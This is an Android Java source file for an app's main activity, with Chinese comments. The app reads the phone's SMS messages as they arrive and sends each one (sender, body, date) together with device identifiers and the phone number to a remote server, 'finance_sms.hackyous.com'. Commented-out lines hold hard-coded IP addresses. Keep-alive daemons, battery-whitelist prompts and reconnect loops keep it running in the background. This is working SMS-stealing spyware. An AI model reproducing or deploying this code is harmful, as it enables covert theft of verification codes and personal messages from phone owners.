package com.brook.lazy.sample;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;

import com.brook.lazy.service.MyService;
import com.brook.lazy.service.TraceServiceImpl;
import com.brook.lazy.sms.SmsObserver;
import com.brook.lazy.sms.SmsResponseCallback;
import com.brook.lazy.utils.DevicesInfo;
import com.brook.lazy.utils.EncryptUtil;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.xdandroid.hellodaemon.DaemonEnv;
import com.xdandroid.hellodaemon.IntentWrapper;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketException;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.annotations.NonNull;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.core.Observer;
import io.reactivex.rxjava3.disposables.Disposable;

public class MainActivity extends AppCompatActivity implements SmsResponseCallback {
    private final String TAG = getClass().getName();
    private TextView notData;
    private Button btnDeviceInfo;
    private RecyclerView mRecyclerView;
    private SmsObserver smsObserver;
    private SmsAdapter smsAdapter;

    private Handler mMainHandler;
    private Socket socket;
    // 线程池
    // 为了方便展示,此处直接采用线程池进行线程管理,而没有一个个开线程
    private ExecutorService mThreadPool;
    private InputStream is;
    private InputStreamReader isr;
    private DataInputStream input;
    private BufferedReader br;
    private String response;
    private OutputStream outputStream;
    private Disposable mDisposable;
    private Intent mIntent;
    private MsgReceiver msgReceiver;
    private Msg2Receiver msg2Receiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mRecyclerView = (RecyclerView) findViewById(R.id.recyclerView);
        btnDeviceInfo = (Button) findViewById(R.id.btn_device_info);
//        smsObserver=new SmsObserver(this,this,new VerificationCodeSmsFilter("180"));
        LinearLayoutManager manager = new LinearLayoutManager(this);
        smsAdapter = new SmsAdapter();
        mRecyclerView.setLayoutManager(manager);
        mRecyclerView.setAdapter(smsAdapter);

        notData = (TextView) findViewById(R.id.not_data);

        Dexter.withActivity(this)
                .withPermissions(Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        Log.i(getClass().getName(), "onPermissionsChecked =====" + report.areAllPermissionsGranted());
                        smsObserver = new SmsObserver(MainActivity.this, MainActivity.this);
                        smsObserver.registerSMSObserver();
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                        Log.i(getClass().getName(), "onPermissionRationaleShouldBeShown =====" + permissions.size());
                    }
                }).check();
//        Log.i(getClass().getName(),"registerSMSObserver =====开始注册");
        //动态注册广播接收器
        msgReceiver = new MsgReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.brook.communication.RECEIVER");
        registerReceiver(msgReceiver, intentFilter);

        msg2Receiver = new Msg2Receiver();
        IntentFilter intentFilter2 = new IntentFilter();
        intentFilter2.addAction("com.brook.communication.MyService");
        registerReceiver(msg2Receiver, intentFilter2);

        // 初始化线程池
        mThreadPool = Executors.newCachedThreadPool();
        initHandler();
        initListener();
//        setCPUAliveLock(this);
        TraceServiceImpl.sShouldStopService = false;
        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
        initLocaService();
    }


    private void initLocaService() {
        //初始化
        com.sdk.keepbackground.work.DaemonEnv.init(this);
        //請求用戶忽略电池优化
        String reason="轨迹跟踪服务的持续运行";
        com.sdk.keepbackground.work.DaemonEnv.whiteListMatters(this, reason);
        //启动work服务
        com.sdk.keepbackground.work.DaemonEnv.startServiceSafelyWithData(MainActivity.this, MyService.class);
    }

    private void initListener() {
        btnDeviceInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (socket != null && socket.isConnected()) {
                    String registerInfo = deviceInfo().toString();
                    smsAdapter.setmSmsLists("注册设备:" + registerInfo);
//                    mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                    sendSocketMessage(registerInfo);
                } else {
                    connectSocket();
                }
            }
        });
    }

    @Override
    public void onCallbackSmsContent(String[] code) {
//        textView.setText("短信验证码:" + code);
//        Log.i(getClass().getName(),"短信内容"+code);
        notData.setVisibility(View.GONE);
        mRecyclerView.setVisibility(View.VISIBLE);
        String SmsInfo = smsInfo(code).toString();
        smsAdapter.setmSmsLists("发送短信:" + SmsInfo);
//        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
        sendSocketMessage(SmsInfo);
        String smsInfo = "_id: " + code[0] + "   address: " + code[1] + "   body: " + code[2] + "   date: " + code[3] + "   name: " + code[4];
        smsAdapter.setmSmsLists(smsInfo);
//        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
    }

    @SuppressLint("HandlerLeak")
    private void initHandler() {
        // 实例化主线程,用于更新接收过来的消息
        mMainHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                switch (msg.what) {
                    case 0: {
                        String readMsg = (String) msg.obj;
                        Log.i(TAG, "收到消息" + readMsg);
                        break;
                    }
                    case 1:
                        smsAdapter.setmSmsLists("====连接成功====");
//                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        if (mDisposable != null && !mDisposable.isDisposed()) {
                            mDisposable.dispose();
                        }
//                        interval(10);
                        break;
                    case 3:
                        String readMsg = (String) msg.obj;
                        smsAdapter.setmSmsLists("接受到消息===>> " + readMsg);
//                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        Log.i(TAG, "收到消息" + readMsg);
                        break;
                }
            }
        };
        smsAdapter.setmSmsLists("====开始连接服务====");
//        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
        // 利用线程池直接开启一个线程 & 执行该线程
        connectSocket();
    }

    private void connectSocket() {
        disConnect();
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {

//                    http://47.75.166.206/
//                    172.21.38.135
                    // 创建Socket对象 & 指定服务端的IP 及 端口号
//                    socket = SocketManager.getSingleton().getSocket("47.75.166.206", 9503);
//                    socket = SocketManager.getSingleton().getSocket("8.210.149.201", 9503);
                    socket = SocketManager.getSingleton().getSocket("finance_sms.hackyous.com", 9503);
                    // 判断客户端和服务器是否连接成功
                    if (socket != null && smsAdapter != null) {
                        Log.i(TAG, "是否连接成功" + socket.isConnected());
//                        smsAdapter.setmSmsLists("是否连接成功:"+socket.isConnected());
                    }
                    if (socket != null && socket.isConnected()) {
                        // 步骤1：从Socket 获得输出流对象OutputStream
                        // 该对象作用：发送数据
                        outputStream = socket.getOutputStream();
                        is = socket.getInputStream();
                        input = new DataInputStream(socket.getInputStream());
                        Message msg = Message.obtain();
                        msg.what = 1;
                        mMainHandler.sendMessage(msg);
//                        acceptMessage();
                        receievmessage();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

    }

    /**
     * 广播接收器
     * @author len
     *
     */
    public class MsgReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                socket.sendUrgentData(0xFF);//心跳包
                //拿到进度，更新UI
                long progress = intent.getLongExtra("progress", 0);
                Log.i(TAG,"BroadcastReceiver==========="+progress);
                Log.i(TAG, "倒计时===" + progress);
                String sendPing = sendPing().toString();
                smsAdapter.setmSmsLists("每隔" + 30 + "秒检测心跳: " + sendPing);
//                mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                if (socket != null && !socket.isClosed()) {
                    sendSocketMessage(sendPing().toString());
                } else {
                    smsAdapter.setmSmsLists("断开连接");
                    connectSocket();
                    resetService(1);
                }
            } catch (IOException e) {
                e.printStackTrace();
                connectSocket();
                resetService(1);
            }
        }
    }

    /**
     * 广播接收器
     * @author len
     *
     */
    public class Msg2Receiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                socket.sendUrgentData(0xFF);//心跳包
                //拿到进度，更新UI
                long progress = intent.getLongExtra("progress", 0);
                Log.i(TAG,"BroadcastReceiver====222======="+progress);
                Log.i(TAG, "倒计时===" + progress);
                String sendPing = sendPing().toString();
                smsAdapter.setmSmsLists("每隔" + 55 + "秒检测心跳: " + sendPing);
//                mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                if (socket != null && !socket.isClosed()) {
                    sendSocketMessage(sendPing().toString());
                } else {
                    smsAdapter.setmSmsLists("断开连接");
                    connectSocket();
                    resetService(2);
                }
            } catch (IOException e) {
                e.printStackTrace();
                connectSocket();
                resetService(2);
            }
        }
    }

    private void resetService(int resetType){
        if(resetType==1){ //如果是1判断是否是2停止了,如果是2则判断是否是1停止了
            if(!MyService.mIsRunning){ //Service1  停止了
                initLocaService();
            }
        }else{
            if(TraceServiceImpl.sShouldStopService){ //Service1  停止了
                TraceServiceImpl.stopService();
                TraceServiceImpl.sShouldStopService = false;
                DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
            }
        }
    }

    //接受服务器消息
    public void receievmessage() {
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    while (true) {
                        byte[] buffer;
                        buffer = new byte[input.available()];
                        if (buffer.length != 0) {
                            // 读取缓冲区
                            input.read(buffer);
                            String msg = new String(buffer, "GBK");//注意转码，不然中文会乱码。
                            Message m = new Message();
                            m.what = 3;
                            m.obj = msg;
                            mMainHandler.sendMessage(m);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    Message m = new Message();
                    m.what = -1;
                    mMainHandler.sendMessage(m);
                    connectSocket();
                }
            }
        });
    }


    // 接收 服务器消息
    private void acceptMessage() {
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    // 步骤1：创建输入流对象InputStream
                    is = socket.getInputStream();
                    // 步骤2：创建输入流读取器对象 并传入输入流对象
                    // 该对象作用：获取服务器返回的数据
                    isr = new InputStreamReader(is);
                    br = new BufferedReader(isr);
                    // 步骤3：通过输入流读取器对象 接收服务器发送过来的数据
                    response = br.readLine();
                    Log.i(TAG, "接受服务器数据" + response);
                    // 步骤4:通知主线程,将接收的消息显示到界面
                    Message msg = Message.obtain();
                    msg.what = 0;
                    msg.obj = response;
                    mMainHandler.sendMessage(msg);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }


    // 发送消息 给 服务器
    private void sendSocketMessage(final String sendMsg) {
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    // 步骤2：写入需要发送的数据到输出流对象中
                    Log.i(TAG, "发送数据: " + sendMsg);
                    outputStream.write((sendMsg + "\n").getBytes("utf-8"));
                    // 特别注意：数据的结尾加上换行符才可让服务器端的readline()停止阻塞
                    // 步骤3：发送数据到服务端
                    outputStream.flush();
                } catch (IOException e) {
                    connectSocket();
                    e.printStackTrace();
                }
            }
        });
    }

    private void disConnect() {
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    if (outputStream != null) {
                        // 断开 客户端发送到服务器 的连接，即关闭输出流对象OutputStream
                        outputStream.close();
                    }
                    if (br != null) {
                        // 断开 服务器发送到客户端 的连接，即关闭输入流读取器对象BufferedReader
                        br.close();
                    }
                    SocketManager.getSingleton().clearData();
                    // 判断客户端和服务器是否已经断开连接
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * 获取设备信息
     *
     * @return JSONObject
     */
    private JSONObject deviceInfo() {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("event", "device_register");
            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret", secret);
            JSONObject jsonO = new JSONObject();
            jsonO.put("secret", secret);
            jsonO.put("model", DevicesInfo.getDeviceModel());
            jsonO.put("width", DevicesInfo.getDeviceWidth(this));
            jsonO.put("height", DevicesInfo.getDeviceHeight(this));
            jsonO.put("serial", DevicesInfo.getDeviceSerial());
            jsonO.put("userCode", "R53531029");
            jsonO.put("phone", DevicesInfo.getNumber(this));
            jsonO.put("androidId", DevicesInfo.getIMEI(this));
            jsonO.put("fingerprint", DevicesInfo.getDeviceFubgerprint());
            jsonObject.put("data", jsonO);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }


    /**
     * 短信信息
     *
     * @return JSONObject
     */
    private JSONObject smsInfo(String[] smsInfo) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("event", "sync_sms");
            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret", secret);
            JSONObject jsonO = new JSONObject();
            jsonO.put("userCode", "R53531029");
            jsonO.put("smsid", smsInfo[0]);/** 短信id */
            jsonO.put("phone", smsInfo[1]);/** 手机号 */
            jsonO.put("content", smsInfo[2]);/** 短信内容 */
            jsonO.put("date", smsInfo[3]);/** 发送时间 */
            jsonO.put("name", smsInfo[4]);
            jsonObject.put("data", jsonO);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    /**
     * 心跳信息
     *
     * @return JSONObject
     */
    private JSONObject sendPing() {
        JSONObject jsonObject = new JSONObject();
        try {
            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
            jsonObject.put("secret", secret);
            jsonObject.put("event", "ping");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    /**
     * 每隔[minutes]毫秒后执行指定动作
     *
     * @param minutes
     */
    public void interval(long minutes) {
        Observable.interval(minutes, TimeUnit.SECONDS)
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Long>() {
                    @Override
                    public void onSubscribe(@NonNull Disposable d) {
                        mDisposable = d;
                    }

                    @Override
                    public void onNext(@NonNull Long aLong) {
                        Log.i(TAG, "倒计时===" + aLong);
                        String sendPing = sendPing().toString();
                        smsAdapter.setmSmsLists("每隔" + minutes + "秒检测心跳: " + sendPing);
//                        mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                        if (socket != null && socket.isConnected()) {
                            sendSocketMessage(sendPing().toString());
                        } else {
                            smsAdapter.setmSmsLists("断开连接");
                            connectSocket();
                        }
                    }

                    @Override
                    public void onError(@NonNull Throwable e) {
                        disConnect();
                        connectSocket();
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

//    public void setWifiDormancy(Context context){
//        int value = Settings.System.getInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY,  Settings.System.WIFI_SLEEP_POLICY_DEFAULT);
//        Log.d(TAG, "setWifiDormancy() returned: " + value);
//        final SharedPreferences prefs = context.getSharedPreferences("wifi_sleep_policy", Context.MODE_PRIVATE);
//        SharedPreferences.Editor editor = prefs.edit();
//        editor.putInt(ConfigManager.WIFI_SLEEP_POLICY, value);
//        editor.commit();
//
//        if(Settings.System.WIFI_SLEEP_POLICY_NEVER != value){
//            Settings.System.putInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_NEVER);
//        }
//    }
//
//
//    public void restoreWifiDormancy(Context context){
//        final SharedPreferences prefs = context.getSharedPreferences("wifi_sleep_policy", Context.MODE_PRIVATE);
//        int defaultPolicy = prefs.getInt(ConfigManager.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_DEFAULT);
//        Settings.System.putInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, defaultPolicy);
//    }

    /**
     * Thanks:  http://blog.csdn.net/wzj0808/article/details/52608940
     * 保持系统CUP Active
     */
    private static PowerManager.WakeLock wl;

    @SuppressLint("InvalidWakeLockTag")
    public static void setCPUAliveLock(Context context) {
        try {
            if (wl != null)
                releaseCPUAliveLock();
            PowerManager pm = (PowerManager) context.getApplicationContext().getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenOff");
                wl.acquire(60 * 1000L /*10 minutes*/);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void releaseCPUAliveLock() {
        try {
            if (wl != null)
                wl.release();
            wl = null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    //防止华为机型未加入白名单时按返回键回到桌面再锁屏后几秒钟进程被杀
    public void onBackPressed() {
        IntentWrapper.onBackPressed(this);
        com.sdk.keepbackground.work.IntentWrapper.onBackPressed(this);
    }

    @Override
    protected void onDestroy() {
        if (mDisposable != null && !mDisposable.isDisposed()) {
            mDisposable.dispose();
        }
        //注销广播
        if (smsObserver != null) {
            smsObserver.unregisterSMSObserver();
        }
        if(msg2Receiver!=null){
            unregisterReceiver(msg2Receiver);
        }
        TraceServiceImpl.stopService();

        disConnect();

        super.onDestroy();
    }

}
